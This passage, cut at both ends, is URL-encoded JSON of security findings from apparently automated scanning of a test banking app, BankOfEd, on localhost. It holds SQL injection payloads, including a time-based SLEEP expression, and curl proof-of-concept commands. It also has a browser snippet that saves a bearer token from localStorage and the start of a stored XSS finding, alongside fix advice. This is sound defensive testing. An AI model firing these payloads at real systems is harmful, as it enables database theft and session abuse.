22%3A%7B%5C%22current_page%5C%22%3A1%2C%5C%22per_page%5C%22%3A15%2C%5C%22total%5C%22%3A16%2C%5C%22total_pages%5C%22%3A2%7D.%20Baseline%20response%20was%20%5C%22customers%5C%22%3A%5B%5D%20and%20%5C%22total%5C%22%3A0.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20original%20nonexistent%20search%20returned%20zero%20rows%2C%20while%20the%20reported%20OR%20payload%20returned%20customer%20records.%20A%20syntax-matched%20AND%20test%20then%20isolated%20database%20evaluation%3A%20%601%3D2%60%20returned%20zero%20rows%20and%20%601%3D1%60%20returned%20the%20customer%20list%2C%20both%20with%20HTTP%20200.%20This%20rules%20out%20generic%20quote%20handling%2C%20a%20search%20fallback%2C%20and%20a%20hardcoded%20response%3B%20no%20concrete%20benign%20explanation%20remained.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20'http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%3Fsearch%3D%2527%2520AND%25201%253D1--%2520%26page%3D1%26per_page%3D15'%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin_test**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20dedicated%20admin%20test%20user%20and%20copy%20its%20bearer%20token%20from%20the%20Authorization%20request%20header%20in%20the%20browser%20Network%20panel.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A03%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22SQL%20injection%20in%20admin%20customer%20search%20count%20query%22%2C%22description%22%3A%22An%20authenticated%20admin%20controls%20the%20GET%20search%20parameter%20on%20%2Fapi%2Fadmin%2Fcustomers.%20AdminUserController%3A%3Aindex%20interpolates%20it%20directly%20into%20a%20LIKE%20predicate%20and%20passes%20the%20resulting%20SQL%20string%20to%20PDO%3A%3Aquery%20for%20the%20count%20query.%20An%20attacker%20with%20admin%20API%20access%20can%20alter%20the%20query%20structure%20and%20read%20or%20modify%20data%20depending%20on%20the%20database%20driver%20configuration.%22%2C%22impact%22%3A%22%22%2C%22likelihood%22%3A%22%22%2C%22recommendation%22%3A%22The%20dynamic%20result%20directly%20confirms%20attacker%20control%20of%20the%20count%20query%20predicate.%20Linked%20to%20the%20existing%20endpoint%20finding.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22%22%2C%22affected_url%22%3A%22BankOfEd-main%2Fsrc%2FControllers%2FAdminUserController.php%3A28%22%2C%22evidence%22%3A%22%24search%20%3D%20%24_GET%5B'search'%5D%20%3F%3F%20''%3B%5Cnif%20(%24search%20!%3D%3D%20'')%20%7B%5Cn%20%20%20%20%24where%20%3D%20%5C%22WHERE%20first_name%20LIKE%20'%25%7B%24search%7D%25'%20OR%20last_name%20LIKE%20'%25%7B%24search%7D%25'%20OR%20email%20LIKE%20'%25%7B%24search%7D%25'%5C%22%3B%5Cn%7D%5Cn%24countSql%20%3D%20%5C%22SELECT%20COUNT(*)%20FROM%20users%20%7B%24where%7D%5C%22%3B%5Cn%24stmt%20%3D%20%24db-%3Equery(%24countSql)%3B%22%2C%22request_evidence%22%3A%22%22%2C%22response_evidence%22%3A%22%22%2C%22finding_source%22%3A%22sast_lead%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20dynamic%20result%20directly%20confirms%20attacker%20control%20of%20the%20count%20query%20predicate.%20Linked%20to%20the%20existing%20endpoint%20finding.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A03%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22SQL%20injection%20in%20admin%20customer%20search%20result%20query%22%2C%22description%22%3A%22An%20authenticated%20admin%20controls%20the%20GET%20search%20parameter%20on%20%2Fapi%2Fadmin%2Fcustomers.%20The%20value%20is%20interpolated%20into%20the%20WHERE%20clause%20of%20the%20customer%20result%20query%2C%20which%20is%20executed%20with%20PDO%3A%3Aquery.%20Crafted%20input%20can%20change%20the%20SQL%20statement%20and%20may%20expose%20database%20data%20beyond%20the%20intended%20customer%20listing.%22%2C%22impact%22%3A%22%22%2C%22likelihood%22%3A%22%22%2C%22recommendation%22%3A%22The%20dynamic%20result%20directly%20confirms%20SQL%20injection%20in%20the%20result%20query.%20Linked%20to%20the%20existing%20endpoint%20finding.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22%22%2C%22affected_url%22%3A%22BankOfEd-main%2Fsrc%2FControllers%2FAdminUserController.php%3A33%22%2C%22evidence%22%3A%22%24search%20%3D%20%24_GET%5B'search'%5D%20%3F%3F%20''%3B%5Cn%24where%20%3D%20%5C%22WHERE%20first_name%20LIKE%20'%25%7B%24search%7D%25'%20OR%20last_name%20LIKE%20'%25%7B%24search%7D%25'%20OR%20email%20LIKE%20'%25%7B%24search%7D%25'%5C%22%3B%5Cn%24sql%20%3D%20%5C%22SELECT%20id%2C%20email%2C%20first_name%2C%20last_name%2C%20phone%2C%20totp_enabled%2C%20created_at%20FROM%20users%20%7B%24where%7D%20ORDER%20BY%20id%20DESC%20LIMIT%20%7B%24perPage%7D%20OFFSET%20%7B%24offset%7D%5C%22%3B%5Cn%24stmt%20%3D%20%24db-%3Equery(%24sql)%3B%22%2C%22request_evidence%22%3A%22%22%2C%22response_evidence%22%3A%22%22%2C%22finding_source%22%3A%22sast_lead%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20dynamic%20result%20directly%20confirms%20SQL%20injection%20in%20the%20result%20query.%20Linked%20to%20the%20existing%20endpoint%20finding.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A03%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22SQL%20Injection%20in%20Transaction%20Sort%20Parameter%22%2C%22description%22%3A%22The%20%60sort%60%20parameter%20on%20%60GET%20%2Fapi%2Ftransactions%60%20is%20inserted%20into%20the%20SQL%20%60ORDER%20BY%60%20clause%20without%20adequate%20validation%2C%20allowing%20authenticated%20customers%20to%20supply%20arbitrary%20MySQL%20expressions.%22%2C%22impact%22%3A%22An%20authenticated%20customer%20can%20execute%20SQL%20expressions%20within%20transaction%20queries.%20Time-based%20conditions%20could%20be%20used%20to%20infer%20database%20contents%2C%20and%20repeated%20delay%20expressions%20could%20reduce%20endpoint%20availability.%20Further%20impact%20depends%20on%20database%20permissions%20and%20driver%20configuration.%22%2C%22likelihood%22%3A%22Exploitation%20requires%20authentication%20but%20is%20straightforward.%20A%20deterministic%20%60SLEEP(1)%60%20expression%20produced%20an%20approximately%20seven-second%20delay%20across%20a%20seven-row%20dataset%20while%20the%20endpoint%20continued%20to%20return%20valid%20transaction%20data.%22%2C%22recommendation%22%3A%22Map%20supported%20sort%20options%20to%20a%20fixed%20server-side%20allowlist%20of%20column%20names%20and%20directions.%20Do%20not%20concatenate%20request%20data%20into%20SQL%20identifiers%20or%20expressions.%20Add%20regression%20tests%20covering%20commas%2C%20SQL%20functions%2C%20comments%2C%20and%20timing%20expressions.%22%2C%22cvss_score%22%3A7.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AN%2FA%3AL%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D1%26page%3D1%26per_page%3D3%26sort%3Dcreated_at%252CIF(1%253D1%252CSLEEP(1)%252C0)%22%2C%22evidence%22%3A%22A%20baseline%20request%20using%20%60sort%3Dcreated_at%60%20returned%20HTTP%20200%20in%2013%20ms.%20Changing%20the%20parameter%20to%20%60sort%3Dcreated_at%2CIF(1%3D1%2CSLEEP(1)%2C0)%60%20returned%20HTTP%20200%20in%207075%20ms%20for%20a%20seven-row%20account%20dataset%20and%20changed%20the%20result%20ordering%20to%20oldest-first.%20Both%20responses%20contained%20valid%20transaction%20data%20and%20reported%20%60total%3D7%60%2C%20showing%20that%20the%20database%20evaluated%20the%20injected%20expression.%22%2C%22request_evidence%22%3A%22GET%20%2Fapi%2Ftransactions%3Faccount_id%3D1%26page%3D1%26per_page%3D3%26sort%3Dcreated_at%252CIF(1%253D1%252CSLEEP(1)%252C0%20using%20configured_primary.%22%2C%22response_evidence%22%3A%22HTTP%20200%20in%207075ms%20compared%20with%2013ms%20baseline.%20Both%20returned%20valid%20transaction%20data%3B%20the%20injected%20response%20ordered%20oldest-first%20and%20pagination%20reported%20total%3D7.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Using%20the%20valid%20%60zoe_test%60%20customer%20session%20and%20its%20own%20account%206%2C%20the%20clean%20%60sort%3Dcreated_at%60%20request%20completed%20in%2015%20ms%20while%20the%20reported%20true-condition%20payload%20completed%20in%206055%20ms%20and%20changed%20the%20first%20page%20from%20newest%20to%20oldest%20transactions.%20A%20matched%20false-condition%20control%2C%20%60IF(1%3D0%2CSLEEP(1)%2C0)%60%2C%20completed%20in%2011%20ms%20with%20the%20same%20response%20body%20as%20the%20true-condition%20request%2C%20while%20the%20true%20condition%20again%20took%206065%20ms.%20This%20rules%20out%20general%20server%20slowness%20and%20shows%20that%20MySQL%20evaluates%20the%20attacker-controlled%20expression%20in%20the%20ORDER%20BY%20clause.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20'http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D6%26page%3D1%26per_page%3D3%26sort%3Dcreated_at%252CIF(1%253D1%252CSLEEP(1)%252C0)'%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**zoe_test**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20Zoe%20test%20customer%20and%20copy%20the%20bearer%20token%20from%20the%20Authorization%20request%20header%20or%20browser%20storage%2C%20then%20send%20it%20as%20%60Authorization%3A%20Bearer%20%3Ctoken%3E%60.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A03%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22SQL%20Injection%20in%20Transaction%20Sort%20Parameter%22%2C%22description%22%3A%22The%20transaction%20endpoint%20inserts%20the%20sort%20parameter%20into%20an%20SQL%20ORDER%20BY%20clause%20without%20safe%20validation.%20A%20single%20quote%20caused%20a%20MariaDB%20syntax%20error%20near%20the%20attacker-controlled%20value.%22%2C%22impact%22%3A%22An%20authenticated%20attacker%20could%20potentially%20alter%20database%20queries%20to%20access%20transaction%20data%2C%20modify%20data%2C%20or%20disrupt%20the%20service.%22%2C%22likelihood%22%3A%22High.%20Direct%20SQL%20parsing%20of%20attacker-controlled%20input%20is%20confirmed%2C%20although%20data%20extraction%20was%20not%20demonstrated.%22%2C%22recommendation%22%3A%22Allow%20only%20predefined%20sort%20column%20names%20and%20directions.%20Never%20concatenate%20request%20values%20into%20SQL%2C%20and%20use%20parameterized%20queries%20for%20all%20values.%22%2C%22cvss_score%22%3A8.8%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AH%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D999%26per_page%3D15%26sort%3Dcreated_at%2527%22%2C%22evidence%22%3A%22The%20request%20with%20sort%3Dcreated_at%2527%20returned%20HTTP%20500%20and%20a%20MariaDB%20syntax%20error%20showing%20the%20injected%20quote%20immediately%20before%20%5C%22DESC%20LIMIT%20%3F%20OFFSET%20%3F%5C%22.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D999%26per_page%3D15%26sort%3Dcreated_at%2527%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20500%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A11%3A00%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20813%5Cnconnection%3A%20close%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22INTERNAL_ERROR%5C%22%2C%5C%22message%5C%22%3A%5C%22SQLSTATE%5B42000%5D%3A%20Syntax%20error%20or%20access%20violation%3A%201064%20You%20have%20an%20error%20in%20your%20SQL%20syntax%3B%20check%20the%20manual%20that%20corresponds%20to%20your%20MariaDB%20server%20version%20for%20the%20right%20syntax%20to%20use%20near%20''%20DESC%5C%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20LIMIT%20%3F%20OFFSET%20%3F'%20at%20line%203%5C%22%2C%5C%22details%5C%22%3A%7B%5C%22file%5C%22%3A%5C%22%5C%5C%2Fvar%5C%5C%2Fwww%5C%5C%2Fhtml%5C%5C%2Fsrc%5C%5C%2FModels%5C%5C%2FTransaction.php%5C%22%2C%5C%22line%5C%22%3A41%2C%5C%22trace%5C%22%3A%5C%22%230%20%5C%5C%2Fvar%5C%5C%2Fwww%5C%5C%2Fhtml%5C%5C%2Fsrc%5C%5C%2FModels%5C%5C%2FTransaction.php(41)%3A%20PDO-%3Eprepare()%5C%5Cn%231%20%5C%5C%2Fvar%5C%5C%2Fwww%5C%5C%2Fhtml%5C%5C%2Fsrc%5C%5C%2FControllers%5C%5C%2FTransactionController.php(29)%3A%20BankOfEd%5C%5C%5C%5CModels%5C%5C%5C%5CTransaction%3A%3AfindByUser()%5C%5Cn%232%20%5Binternal%20function%5D%3A%20BankOfEd%5C%5C%5C%5CControllers%5C%5C%5C%5CTransactionController%3A%3Aindex()%5C%5Cn%233%20%5C%5C%2Fvar%5C%5C%2Fwww%5C%5C%2Fhtml%5C%5C%2Fsrc%5C%5C%2FRouter.php(125)%3A%20call_user_func_array()%5C%5Cn%234%20%5C%5C%2Fvar%5C%5C%2Fwww%5C%5C%2Fhtml%5C%5C%2Fpublic%5C%5C%2Findex.php(26)%3A%20BankOfEd%5C%5C%5C%5CRouter%3A%3Adispatch()%5C%5Cn%235%20%7Bmain%7D%5C%22%7D%7D%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D999%26per_page%3D15%26sort%3Dcreated_at%2527%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20500%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A11%3A00%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20813%5Cnconnection%3A%20close%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22INTERNAL_ERROR%5C%22%2C%5C%22message%5C%22%3A%5C%22SQLSTATE%5B42000%5D%3A%20Syntax%20error%20or%20access%20violation%3A%201064%20You%20have%20an%20error%20in%20your%20SQL%20syntax%3B%20check%20the%20manual%20that%20corresponds%20to%20your%20MariaDB%20server%20version%20for%20the%20right%20syntax%20to%20use%20near%20''%20DESC%5C%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20LIMIT%20%3F%20OFFSET%20%3F'%20at%20line%203%5C%22%2C%5C%22details%5C%22%3A%7B%5C%22file%5C%22%3A%5C%22%5C%5C%2Fvar%5C%5C%2Fwww%5C%5C%2Fhtml%5C%5C%2Fsrc%5C%5C%2FModels%5C%5C%2FTransaction.php%5C%22%2C%5C%22line%5C%22%3A41%2C%5C%22trace%5C%22%3A%5C%22%230%20%5C%5C%2Fvar%5C%5C%2Fwww%5C%5C%2Fhtml%5C%5C%2Fsrc%5C%5C%2FModels%5C%5C%2FTransaction.php(41)%3A%20PDO-%3Eprepare()%5C%5Cn%231%20%5C%5C%2Fvar%5C%5C%2Fwww%5C%5C%2Fhtml%5C%5C%2Fsrc%5C%5C%2FControllers%5C%5C%2FTransactionController.php(29)%3A%20BankOfEd%5C%5C%5C%5CModels%5C%5C%5C%5CTransaction%3A%3AfindByUser()%5C%5Cn%232%20%5Binternal%20function%5D%3A%20BankOfEd%5C%5C%5C%5CControllers%5C%5C%5C%5CTransactionController%3A%3Aindex()%5C%5Cn%233%20%5C%5C%2Fvar%5C%5C%2Fwww%5C%5C%2Fhtml%5C%5C%2Fsrc%5C%5C%2FRouter.php(125)%3A%20call_user_func_array()%5C%5Cn%234%20%5C%5C%2Fvar%5C%5C%2Fwww%5C%5C%2Fhtml%5C%5C%2Fpublic%5C%5C%2Findex.php(26)%3A%20BankOfEd%5C%5C%5C%5CRouter%3A%3Adispatch()%5C%5Cn%235%20%7Bmain%7D%5C%22%7D%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22With%20the%20listed%20admin%20session%2C%20the%20clean%20request%20for%20account%203%20returned%20200%20and%20an%20empty%20transaction%20result%2C%20while%20the%20identical%20request%20with%20sort%3Dcreated_at'%20returned%20500.%20The%20error%20is%20a%20payload-dependent%20MariaDB%201064%20from%20PDO%3A%3Aprepare%20and%20includes%20the%20injected%20quote%20immediately%20before%20DESC%20LIMIT%2FOFFSET%2C%20so%20it%20is%20not%20a%20hardcoded%20error%20or%20an%20authorization%20failure.%20Anonymous%20and%20other%20listed%20sessions%20either%20stopped%20at%20authentication%20or%20did%20not%20have%20account%203%3B%20no%20benign%20explanation%20remains%20for%20the%20authenticated%20differential.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20'http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D999%26per_page%3D15%26sort%3Dcreated_at%2527'%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20admin%20user%20and%20copy%20the%20bearer%20token%20from%20the%20Authorization%20header%20in%20the%20browser%20DevTools%20Network%20request.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A03%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22SQL%20Injection%20via%20Transaction%20Sort%20Parameter%22%2C%22description%22%3A%22The%20GET%20%2Fapi%2Ftransactions%20endpoint%20places%20the%20attacker-controlled%20sort%20query%20parameter%20into%20an%20SQL%20ORDER%20BY%20clause%20without%20allow-listing%20it%20as%20a%20valid%20column%20name.%20Adding%20a%20single%20quote%20to%20the%20parameter%20changes%20a%20successful%20response%20into%20a%20MariaDB%20syntax%20error%2C%20showing%20that%20the%20value%20reaches%20the%20SQL%20parser.%22%2C%22impact%22%3A%22An%20authenticated%20attacker%20could%20alter%20the%20generated%20SQL%20statement.%20Depending%20on%20the%20database%20permissions%20and%20PDO%20configuration%2C%20further%20exploitation%20may%20allow%20access%20to%20sensitive%20database%20data%2C%20modification%20or%20deletion%20of%20data%2C%20or%20query-based%20denial%20of%20service.%20Failed%20queries%20also%20expose%20database%20error%20details.%22%2C%22likelihood%22%3A%22High.%20The%20parameter%20is%20directly%20accessible%20to%20an%20authenticated%20low-privilege%20user%2C%20and%20a%20single%20quote%20reliably%20triggers%20a%20MariaDB%20parser%20error%20at%20the%20injected%20position.%20The%20captured%20evidence%20confirms%20SQL%20injection%2C%20although%20extraction%20or%20modification%20of%20data%20was%20not%20demonstrated.%22%2C%22recommendation%22%3A%22Map%20each%20supported%20sort%20value%20to%20a%20fixed%20SQL%20column%20name%2C%20such%20as%20created_at%20or%20amount%2C%20and%20reject%20values%20outside%20that%20allow-list.%20Validate%20the%20sort%20direction%20through%20a%20separate%20allow-list.%20Continue%20using%20prepared%20statements%20for%20data%20values.%20Return%20generic%20error%20responses%20without%20database%20messages%2C%20file%20paths%2C%20or%20stack%20traces.%22%2C%22cvss_score%22%3A8.8%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AH%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D999%26per_page%3D15%26sort%3Dcreated_at%2527%22%2C%22evidence%22%3A%22A%20request%20without%20the%20sort%20parameter%20returned%20HTTP%20200.%20Captured%20traffic%20ID%20183944%20used%20sort%3Dcreated_at%2527%20and%20returned%20HTTP%20500%20with%20MariaDB%20error%201064%20near%20%5C%22'%20DESC%5C%5Cn%20LIMIT%20%3F%20OFFSET%20%3F%5C%22.%20The%20captured%20trace%20identified%20%2Fvar%2Fwww%2Fhtml%2Fsrc%2FModels%2FTransaction.php%20line%2041%20and%20PDO-%3Eprepare()%2C%20confirming%20that%20the%20supplied%20sort%20value%20reached%20SQL%20parsing.%22%2C%22request_evidence%22%3A%22GET%20%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D999%26per_page%3D15%26sort%3Dcreated_at%2527%20HTTP%2F1.1%5CnHost%3A%20localhost%3A8081%5CnAuthorization%3A%20Bearer%20%5BREDACTED_BEARER%5D%22%2C%22response_evidence%22%3A%22HTTP%2F1.1%20500%20Internal%20Server%20Error%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22INTERNAL_ERROR%5C%22%2C%5C%22message%5C%22%3A%5C%22SQLSTATE%5B42000%5D%3A%20Syntax%20error%20or%20access%20violation%3A%201064%20You%20have%20an%20error%20in%20your%20SQL%20syntax%3B%20check%20the%20manual%20that%20corresponds%20to%20your%20MariaDB%20server%20version%20for%20the%20right%20syntax%20to%20use%20near%20''%20DESC%5C%5Cn%20LIMIT%20%3F%20OFFSET%20%3F'%20at%20line%203%5C%22%7D%7D%22%2C%22finding_source%22%3A%22specialist_agent%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Using%20the%20supplied%20admin%20session%2C%20the%20clean%20request%20with%20sort%3Dcreated_at%20returned%20200%20and%20an%20empty%20transaction%20result.%20Changing%20only%20sort%20to%20created_at%2527%20returned%20500%20with%20a%20MariaDB%201064%20syntax%20error%20from%20PDO-%3Eprepare()%20at%20Transaction.php%20line%2041%2C%20and%20the%20error%20identifies%20the%20injected%20quote%20immediately%20before%20the%20fixed%20DESC%20clause.%20This%20differential%20rules%20out%20a%20hardcoded%20error%20response%20and%20confirms%20that%20the%20sort%20value%20is%20inserted%20into%20SQL%20without%20safe%20allow-listing.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20'http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D999%26per_page%3D15%26sort%3Dcreated_at%2527'%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20admin%20user%2C%20copy%20the%20bearer%20token%20from%20the%20Authorization%20request%20header%20in%20the%20browser%20Network%20panel%2C%20and%20replay%20the%20request%20with%20that%20token.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A03%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Stored%20XSS%20in%20account%20name%20executes%20on%20admin%20accounts%20page%22%2C%22description%22%3A%22The%20account%20creation%20API%20accepts%20JavaScript%20syntax%20in%20the%20account_name%20field%20and%20stores%20it%20without%20preventing%20its%20use%20in%20an%20executable%20context.%20The%20admin%20accounts%20page%20inserts%20the%20value%20into%20an%20inline%20onclick%20handler%20using%20innerHTML.%20Although%20the%20value%20is%20HTML-escaped%2C%20entity%20decoding%20restores%20apostrophes%20before%20the%20handler%20is%20compiled%2C%20allowing%20the%20stored%20script%20to%20execute%20when%20an%20administrator%20clicks%20Edit%20Balance.%22%2C%22impact%22%3A%22A%20low-privileged%20banking%20user%20can%20execute%20JavaScript%20in%20an%20administrator's%20browser.%20The%20script%20runs%20in%20the%20admin%20application%20origin%20and%20could%20access%20the%20administrator's%20localStorage%20bearer%20token%2C%20perform%20authenticated%20administrative%20actions%2C%20or%20read%20sensitive%20customer%20and%20account%20data.%22%2C%22likelihood%22%3A%22High.%20The%20payload%20was%20stored%20successfully%2C%20appeared%20on%20the%20first%20page%20of%20the%20admin%20account%20list%2C%20and%20executed%20when%20the%20Edit%20Balance%20control%20was%2